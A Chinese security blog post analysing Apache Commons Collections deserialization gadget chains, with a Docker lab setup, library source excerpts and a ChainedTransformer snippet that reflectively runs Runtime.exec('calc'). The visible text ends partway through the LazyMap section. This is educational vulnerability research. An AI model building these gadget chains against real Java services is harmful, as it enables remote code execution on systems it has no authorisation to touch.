<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    
    <title>Commons Collections链分析 | Math &amp; Sec ，HACHp1的个人博客</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="Commons Collections链分析   Commons Collections链分析  前言 环境搭建 Transformer接口的各种实现（用作POP链的关键链结）  Transformer接口 ConstantTransformer类 InvokerTransformer类 InstantiateTransformer类 ChainedTransformer">
<meta name="keywords" content="Web安全">
<meta property="og:type" content="article">
<meta property="og:title" content="Commons Collections链分析">
<meta property="og:url" content="https://hachp1.github.io/posts/Web安全/20220407-cc_analysis.html">
<meta property="og:site_name" content="Math &amp; Sec ，HACHp1的个人博客">
<meta property="og:description" content="Commons Collections链分析   Commons Collections链分析  前言 环境搭建 Transformer接口的各种实现（用作POP链的关键链结）  Transformer接口 ConstantTransformer类 InvokerTransformer类 InstantiateTransformer类 ChainedTransformer">
<meta property="og:image" content="http://129.204.230.95/img/thumbnails/planet_red.png">
<meta property="og:updated_time" content="2025-02-06T15:11:50.433Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Commons Collections链分析">
<meta name="twitter:description" content="Commons Collections链分析   Commons Collections链分析  前言 环境搭建 Transformer接口的各种实现（用作POP链的关键链结）  Transformer接口 ConstantTransformer类 InvokerTransformer类 InstantiateTransformer类 ChainedTransformer">
<meta name="twitter:image" content="http://129.204.230.95/img/thumbnails/planet_red.png">
    

    

    
        <link rel="icon" href="/css/images/favicon.png" />
    

    <link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="/libs/open-sans/styles.css">
    <link rel="stylesheet" href="/libs/source-code-pro/styles.css">

    <link rel="stylesheet" href="/css/style.css">

    <script src="/libs/jquery/2.1.3/jquery.min.js"></script>
    
    
        <link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
    
    
    
    
    


</head>

<body>
    <div id="container">
        <header id="header">
    <div id="header-main" class="header-inner">
        <div class="outer">
            <a href="/" id="logo">
                <i class="logo"></i>
                <span class="site-title">Math &amp; Sec ，HACHp1的个人博客</span>
            </a>
            <nav id="main-nav">
                
                    <a class="main-nav-link" href="/.">主页</a>
                
                    <a class="main-nav-link" href="/archives">归档</a>
                
                    <a class="main-nav-link" href="/categories">目录</a>
                
                    <a class="main-nav-link" href="/tags">标签</a>
                
                    <a class="main-nav-link" href="/about">关于</a>
                
            </nav>
            
                
                <nav id="sub-nav">
                    <div class="profile" id="profile-nav">
                        <a id="profile-anchor" href="javascript:;">
                            <img class="avatar" src="/css/images/avatar.png" />
                            <i class="fa fa-caret-down"></i>
                        </a>
                    </div>
                </nav>
            
            <div id="search-form-wrap">

    <form class="search-form">
        <input type="text" class="ins-search-input search-form-input" placeholder="搜索" />
        <button type="submit" class="search-form-submit"></button>
    </form>
    <div class="ins-search">
    <div class="ins-search-mask"></div>
    <div class="ins-search-container">
        <div class="ins-input-wrapper">
            <input type="text" class="ins-search-input" placeholder="想要查找什么..." />
            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: '文章',
            PAGES: '页面',
            CATEGORIES: '分类',
            TAGS: '标签',
            UNTITLED: '(未命名)',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>
<script src="/js/insight.js"></script>

</div>
        </div>
    </div>
    <div id="main-nav-mobile" class="header-sub header-inner">
        <table class="menu outer">
            <tr>
                
                    <td><a class="main-nav-link" href="/.">主页</a></td>
                
                    <td><a class="main-nav-link" href="/archives">归档</a></td>
                
                    <td><a class="main-nav-link" href="/categories">目录</a></td>
                
                    <td><a class="main-nav-link" href="/tags">标签</a></td>
                
                    <td><a class="main-nav-link" href="/about">关于</a></td>
                
                <td>
                    
    <div class="search-form">
        <input type="text" class="ins-search-input search-form-input" placeholder="搜索" />
    </div>

                </td>
            </tr>
        </table>
    </div>
</header>

        <div class="outer">
            
                

<aside id="profile">
    <div class="inner profile-inner">
        <div class="base-info profile-block">
            <img id="avatar" src="/css/images/avatar.png" />
            <h2 id="name">HACHp1</h2>
            <h3 id="title">生活少有按照行动而改变，那就抓住那几个少有的。</h3>
            <span id="location"><i class="fa fa-map-marker"></i>China</span>
            <a id="follow" target="_blank" href="https://github.com/hachp1">关注我</a>
        </div>
        <div class="article-info profile-block">
            <div class="article-info-block">
                48
                <span>文章</span>
            </div>
            <div class="article-info-block">
                9
                <span>标签</span>
            </div>
        </div>
        
        <div class="profile-block social-links">
            <table>
                <tr>
                    
                    
                    <td>
                        <a href="https://github.com/HACHp1" target="_blank" title="GitHub" class=tooltip>
                            <i class="fa fa-GitHub"></i>
                        </a>
                    </td>
                    
                </tr>
            </table>
        </div>
        
    </div>
</aside>

            
            <section id="main"><article id="post-Commons-Collections链分析" class="article article-type-post" itemscope itemprop="blogPost">
    <div class="article-inner">
    
        
            
	
		<img src="http://129.204.230.95/img/banner/Eur3.jpg" class="article-banner" />
	



        
        
        
        
        
        
        
        
            <header class="article-header">
                
    
        <h1 class="article-title" itemprop="name">
            Commons Collections链分析
        </h1>
    

                
                    <div class="article-meta">
                        
    <div class="article-date">
        <i class="fa fa-calendar"></i>
        <a href="/posts/Web安全/20220407-cc_analysis.html">
            <time datetime="2022-04-07T01:23:09.000Z" itemprop="datePublished">2022-04-07</time>
        </a>
    </div>


                        
    <div class="article-category">
    	<i class="fa fa-folder"></i>
        <a class="article-category-link" href="/categories/Web安全/">Web安全</a>
    </div>

                        
    <div class="article-tag">
        <i class="fa fa-tag"></i>
        <a class="tag-link" href="/tags/Web安全/">Web安全</a>
    </div>

                    </div>
                
            </header>
                
            
        
        
        <div class="article-entry" itemprop="articleBody">
        
            
			<h1 id="commons-collections链分析">Commons Collections链分析</h1>
<!-- TOC -->
<ul>
<li><a href="#commons-collections链分析">Commons Collections链分析</a>
<ul>
<li><a href="#前言">前言</a></li>
<li><a href="#环境搭建">环境搭建</a></li>
<li><a href="#transformer接口的各种实现用作pop链的关键链结">Transformer接口的各种实现（用作POP链的关键链结）</a>
<ul>
<li><a href="#transformer接口">Transformer接口</a></li>
<li><a href="#constanttransformer类">ConstantTransformer类</a></li>
<li><a href="#invokertransformer类">InvokerTransformer类</a></li>
<li><a href="#instantiatetransformer类">InstantiateTransformer类</a></li>
<li><a href="#chainedtransformer类">ChainedTransformer类</a></li>
</ul></li>
<li><a href="#cc1">CC1</a>
<ul>
<li><a href="#proxy类">Proxy类</a></li>
<li><a href="#annotationinvocationhandler类">AnnotationInvocationHandler类</a></li>
<li><a href="#lazymap类">LazyMap类</a></li>
<li><a href="#jdk-18-中的修复">jdk 1.8 中的修复</a></li>
</ul></li>
<li><a href="#cc3">CC3</a>
<ul>
<li><a href="#traxfilter类">TrAXFilter类</a></li>
<li><a href="#templatesimpl类">TemplatesImpl类</a></li>
</ul></li>
<li><a href="#cc2">CC2</a>
<ul>
<li><a href="#priorityqueue类">PriorityQueue类</a></li>
<li><a href="#transformingcomparator类">TransformingComparator类</a></li>
</ul></li>
<li><a href="#cc4">CC4</a></li>
<li><a href="#cc5">CC5</a>
<ul>
<li><a href="#badattributevalueexpexception类">BadAttributeValueExpException类</a></li>
<li><a href="#tiedmapentry类">TiedMapEntry类</a></li>
<li><a href="#idea调试的坑">idea调试的坑</a></li>
</ul></li>
<li><a href="#cc6">CC6</a>
<ul>
<li><a href="#hashmap类">HashMap类</a></li>
<li><a href="#tiedmapentry类-1">TiedMapEntry类</a></li>
</ul></li>
<li><a href="#cc7">CC7</a>
<ul>
<li><a href="#hashtable类">Hashtable类</a></li>
<li><a href="#lazymap类进一步理解以及hashmap">LazyMap类进一步理解以及HashMap</a></li>
<li><a href="#一些细节">一些细节</a></li>
</ul></li>
<li><a href="#urldns">URLDNS</a></li>
<li><a href="#总结">总结</a></li>
<li><a href="#参考资料">参考资料</a></li>
</ul></li>
</ul>
<!-- /TOC -->
<a id="more"></a>
<h2 id="前言">前言</h2>
<p>CC链，作为Java反序列化漏洞学习的必修部分，在这里填个坑。</p>
<h2 id="环境搭建">环境搭建</h2>
<p>老样子，用Docker远程调试是最方便的，在这里根据<a href="https://github.com/p1n93r/javasec" target="_blank" rel="external">javasec</a>构建自己的docker镜像：</p>
<p>漏洞环境与<a href="https://github.com/p1n93r/javasec" target="_blank" rel="external">javasec</a>基本一致，只不过使用spring boot设置了一系列路由，然后使用mvn构建jar包：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mvn clean install -DskipTests</div></pre></td></tr></table></figure>
<p>然后是构造dockerfile，java版本有限制，版本需要比7u21小，找了一大圈没有现成的镜像，只能自己构建。最后得到的环境能够复现<strong>除CC5之外的其他链</strong>（CC5需要jdk 1.8）。</p>
<p>Docker file:</p>
<figure class="highlight docker"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">18.04</span></div><div class="line"></div><div class="line"><span class="keyword">RUN</span><span class="bash"> apt-get update</span></div><div class="line"><span class="bash">RUN apt-get install -y iputils-ping</span></div><div class="line"><span class="bash"></span></div><div class="line"><span class="bash">ADD jdk-7u21-linux-x64.tar.gz /usr/<span class="built_in">local</span></span></div><div class="line"><span class="bash">ENV JAVA_HOME /usr/<span class="built_in">local</span>/jdk1.7.0_21</span></div><div class="line"><span class="bash">ENV PATH <span class="variable">$PATH</span>:<span class="variable">$JAVA_HOME</span>/bin</span></div><div class="line"><span class="bash"></span></div><div class="line"><span class="bash">ENV JAVA_TOOL_OPTIONS -agentlib:jdwp=transport=dt_socket,address=10087,server=y,<span class="built_in">suspend</span>=n</span></div><div class="line"><span class="bash"></span></div><div class="line"><span class="bash">COPY deser-0.0.1-SNAPSHOT.jar /usr/src/deser.jar</span></div><div class="line"><span class="bash">EXPOSE 10086</span></div><div class="line"><span class="bash"></span></div><div class="line"><span class="bash">CMD [<span class="string">"java"</span>, <span class="string">"-Dserver.address=0.0.0.0"</span>, <span class="string">"-Dserver.port=10086"</span>, <span class="string">"-jar"</span>, <span class="string">"/usr/src/deser.jar"</span>]</span></div></pre></td></tr></table></figure>
<p>docker-compose.yml:</p>
<figure class="highlight docker"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">version : <span class="string">'2'</span></div><div class="line"></div><div class="line">services:</div><div class="line">  server:</div><div class="line">    build:</div><div class="line">      context: .</div><div class="line">      dockerfile: Dockerfile</div><div class="line">    ports:</div><div class="line">      - <span class="string">"10086:10086"</span></div><div class="line">      - <span class="string">"10087:10087"</span></div></pre></td></tr></table></figure>
<p>环境已上传：<a href="https://github.com/HACHp1/CC_docker_remote" target="_blank" rel="external">CC_docker_remote</a></p>
<h2 id="transformer接口的各种实现用作pop链的关键链结">Transformer接口的各种实现（用作POP链的关键链结）</h2>
<p>主要参考了<a href="https://xz.aliyun.com/t/9409" target="_blank" rel="external">CC链 1-7 分析</a>对常用的链结的单独分析，可以很好地帮助理解。在这里根据该文记录一下自己的理解。</p>
<h3 id="transformer接口">Transformer接口</h3>
<p>Transformer接口是Commom Collection库中的一个很常用的接口，重点在于方便的“对象转化”，可以把Transformer接口的众多实现看作一系列的类处理器，能够对类<strong>进行各种不同的操作</strong>，将一种类转化为另一种类。这些实现的核心是<strong>定义了自己的 <code>transform()</code> 方法</strong>，其中包括返回某值、调用某个指定方法等。</p>
<p>参考：<a href="https://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/org/apache/commons/collections/Transformer.html" target="_blank" rel="external">Interface Transformer</a></p>
<h3 id="constanttransformer类">ConstantTransformer类</h3>
<p><strong>“常量”转化器</strong>，顾名思义，每次都返回同一个“常量对象”，实现了一个<strong>每次都返回其初始值</strong>的转化类。具体而言，其初始化时对 <code>this.iConstant</code> 进行赋值，然后每次调用 <code>transform()</code> 时会返回 <code>this.iConstant</code> 。</p>
<h3 id="invokertransformer类">InvokerTransformer类</h3>
<p><strong>“方法调用”转化器</strong>，顾名思义，调用 <code>transform()</code> 时会调用初始化时赋值的一种方法（通过对 <code>this.iMethodName</code> 反射得到）对其要处理的对象进行处理。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</div><div class="line">    ...</div><div class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String iMethodName;</div><div class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</div><div class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</div><div class="line"></div><div class="line">    <span class="comment">//构造函数</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</div><div class="line">        <span class="keyword">this</span>.iMethodName = methodName;</div><div class="line">        <span class="keyword">this</span>.iParamTypes = paramTypes;</div><div class="line">        <span class="keyword">this</span>.iArgs = args;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">//重写的 transform 方法，反射调用指定的方法并返回方法调用结果</span></div><div class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</div><div class="line">        ...</div><div class="line">                Class cls = input.getClass();</div><div class="line">                Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</div><div class="line">                <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</div><div class="line">        ...</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="instantiatetransformer类">InstantiateTransformer类</h3>
<p><strong>“实例化”转化器</strong>，顾名思义，反射调用构造函数以将对应的类实例化。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InstantiateTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</div><div class="line">    ...</div><div class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Transformer NO_ARG_INSTANCE = <span class="keyword">new</span> InstantiateTransformer();</div><div class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</div><div class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</div><div class="line"></div><div class="line">    <span class="comment">//构造函数</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InstantiateTransformer</span><span class="params">(Class[] paramTypes, Object[] args)</span> </span>&#123;</div><div class="line">        <span class="keyword">this</span>.iParamTypes = paramTypes;</div><div class="line">        <span class="keyword">this</span>.iArgs = args;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">//重写的 transform 方法，反射调用构造函数将类实例化。</span></div><div class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</div><div class="line">        Constructor con = ((Class)input).getConstructor(<span class="keyword">this</span>.iParamTypes);</div><div class="line">        <span class="keyword">return</span> con.newInstance(<span class="keyword">this</span>.iArgs);</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<h3 id="chainedtransformer类">ChainedTransformer类</h3>
<p><strong>“链式处理”转化器</strong>，顾名思义，使用该类时，我们可以初始化一个 <code>Transformer[]</code> 数组，调用 <code>transform()</code> 时会依次运用这个数组中的转化器。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChainedTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</div><div class="line">    ...</div><div class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Transformer[] iTransformers;</div><div class="line"></div><div class="line">    <span class="comment">//构造函数</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</div><div class="line">        <span class="keyword">this</span>.iTransformers = transformers;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">//重写的 transform 方法，链式调用  Transformer[] 中每个 Transformer 的 transform 方法</span></div><div class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</div><div class="line">            object = <span class="keyword">this</span>.iTransformers[i].transform(object);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> object;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在构造系统命令执行的操作中，一般使用该类对一系列的对象获取过程进行实现：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</div><div class="line">        <span class="comment">//Transformer数组</span></div><div class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</div><div class="line">        <span class="comment">//对照一下：Runtime.getRuntime().exec('calc')，注意过程中的反射机制</span></div><div class="line">        <span class="comment">//由于第一个链是常量转化器，所以transform传什么参数都一样</span></div><div class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</div><div class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</div><div class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</div><div class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"calc"</span>&#125;)</div><div class="line">        &#125;;</div><div class="line"></div><div class="line">        <span class="comment">//ChainedTransformer实例</span></div><div class="line">        Transformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</div><div class="line">        chainedTransformer.transform(<span class="string">"test123"</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>以上这些类是直接用来执行恶意指令的，但<strong>核心是需要触发任意类的 <code>transform()</code> 方法</strong>，各个CC链使用了不同的方法从 <code>readObject()</code> 到执行任意类的 <code>transform()</code> 。</p>
<h2 id="cc1">CC1</h2>
<p>我们详细分析CC1的利用过程，在CC2-7中是类似的，类比即可<br>
环境要求：CC 3.1-3.2.1, jdk &lt; u71</p>
<h3 id="proxy类">Proxy类</h3>
<p>在分析具体的链之前，我们先学习一下Java的动态代理，其关键类是 <code>java.lang.reflect.Proxy</code></p>
<ul>
<li>什么是代理？代理对象 = 增强代码（附加的操作） + 目标对象（原对象）。有了代理对象后，就<strong>不使用</strong>原对象了（用代理对象来<strong>代替</strong>原对象，进行一些<strong>额外操作</strong>）</li>
<li>什么情况使用代理？例：当我们需要对原对象进行日志记录时（类似于python的装饰器，在调用该对象前做某些操作）</li>
<li>如何实现静态代理？需要对原来的类实现一个一模一样的代理类，并在其基础上加入代理的额外操作。这样很麻烦</li>
<li>如何简化这个过程？使用动态代理</li>
<li>动态代理原理是什么？怎么使用？动态代理时，java通过<strong>现有的类动态创建一个新的类</strong>，并在其基础上添加一些额外操作，并且这个过程仅需要一行代码：</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 如何创建动态代理：</span></div><div class="line"></div><div class="line">Object proxy = Proxy.newProxyInstance(</div><div class="line">    <span class="comment">/*类加载器*/</span></div><div class="line">	target.getClass().getClassLoader(),</div><div class="line">	</div><div class="line">	<span class="comment">/*让代理对象和目标对象实现相同接口*/</span></div><div class="line">	target.getClass().getInterfaces(),</div><div class="line">	</div><div class="line">	<span class="comment">/*代理对象的方法最终都会被JVM导向它的invoke方法*/</span></div><div class="line">	<span class="keyword">new</span> InvocationHandler()&#123;</div><div class="line">		<span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</div><div class="line">			System.out.println(method.getName() + <span class="string">"方法开始执行..."</span>);</div><div class="line">			Object result = method.invoke(target, args);</div><div class="line">			System.out.println(result);</div><div class="line">			System.out.println(method.getName() + <span class="string">"方法执行结束..."</span>);</div><div class="line">			<span class="keyword">return</span> result;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">);</div><div class="line"></div><div class="line">proxy.xxx(); <span class="comment">//用proxy代替原target对象</span></div></pre></td></tr></table></figure>
<p><strong>每次</strong>调用代理对象的<strong>任意方法</strong>，最终都会调用 <code>InvocationHandler</code> 的 <code>invoke()</code> 方法。通过类似hook的方式，对原对象的<strong>每个成员方法</strong>都进行hook。</p>
<p>参考：<a href="https://www.zhihu.com/question/20794107/answer/658139129" target="_blank" rel="external">Java 动态代理作用是什么？ - bravo1988的回答 - 知乎</a></p>
<h3 id="annotationinvocationhandler类">AnnotationInvocationHandler类</h3>
<ul>
<li>从头开始分析，CC1的入口是<code>AnnotationInvocationHandler</code>类(<code>sun.reflect.annotation.AnnotationInvocationHandler</code>)的<code>readObject()</code>，其中执行了<code>this.memberValues.entrySet()</code>，调用了<code>this.memberValues</code>的成员方法。所以我们可以将其设置为动态代理。然后我们再构造另一个<code>AnnotationInvocationHandler</code>，并设置为代理的<code>InvocationHandler</code>，进而调用该<code>InvocationHandler</code>的<code>invoke()</code>方法</li>
<li>然后，CC1链通过是<code>AnnotationInvocationHandler</code>的<code>invoke()</code>方法触发<code>LazyMap</code>的<code>get</code>方法。其关键代码：</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span>, <span class="title">Serializable</span> </span>&#123;</div><div class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? extends Annotation&gt; type;</div><div class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</div><div class="line"></div><div class="line">    <span class="comment">//构造函数，可传入 LazyMap</span></div><div class="line">    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</div><div class="line">        <span class="keyword">this</span>.type = var1;</div><div class="line">        <span class="keyword">this</span>.memberValues = var2;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">//利用 invoke 方法可实现调用 LazyMap#get</span></div><div class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> </span>&#123;</div><div class="line">        Object var6 = <span class="keyword">this</span>.memberValues.get(var4); <span class="comment">//关键点</span></div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</div><div class="line">        var1.defaultReadObject();</div><div class="line">        AnnotationType var2 = <span class="keyword">null</span>;</div><div class="line"></div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            var2 = AnnotationType.getInstance(<span class="keyword">this</span>.type);</div><div class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        Map var3 = var2.memberTypes();</div><div class="line">        </div><div class="line">        <span class="comment">//注意这里的entrySet()，属于成员方法调用，会触发动态代理对象的invoke()方法：</span></div><div class="line">        Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator();</div><div class="line"></div><div class="line">        <span class="keyword">while</span>(var4.hasNext()) &#123;</div><div class="line">            Entry var5 = (Entry)var4.next();</div><div class="line">            String var6 = (String)var5.getKey();</div><div class="line">            Class var7 = (Class)var3.get(var6);</div><div class="line">            <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123;</div><div class="line">                Object var8 = var5.getValue();</div><div class="line">                <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</div><div class="line">                    var5.setValue((<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class="string">"["</span> + var8 + <span class="string">"]"</span>)).setMember((Method)var2.members().get(var6)));</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>我们继续分析LazyMap类的 <code>get()</code></p>
<h3 id="lazymap类">LazyMap类</h3>
<ul>
<li>LazyMap类（<code>org.apache.commons.collections.map.LazyMap</code>）的<code>get</code>方法中可以调用任意类的<code>transform</code>方法：</li>
</ul>
